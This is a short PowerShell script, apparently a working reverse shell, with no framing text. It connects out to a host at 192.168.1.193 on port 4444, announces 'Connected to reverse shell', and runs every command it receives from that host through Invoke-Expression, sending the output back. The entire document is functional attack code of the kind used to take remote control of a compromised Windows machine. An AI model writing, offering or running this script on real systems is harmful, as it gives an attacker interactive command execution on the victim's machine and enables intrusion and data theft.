$client = New-Object System.Net.Sockets.TcpClient("192.168.1.193", 4444);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$reader = New-Object System.IO.StreamReader($stream);
$writer.AutoFlush = $true;

try {
    $writer.WriteLine("Connected to reverse shell.")
    while ($client.Connected) {
        $data = $reader.ReadLine();
        if ($data -eq "exit") { break }
        try {
            $sendback = iex $data 2>&1 | Out-String;
            $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
            $writer.WriteLine($sendback2);
        } catch {
            $writer.WriteLine("Error: $_");
        }
    }
} catch {
    $writer.WriteLine("Disconnected")
} finally {
    $client.Close();
}
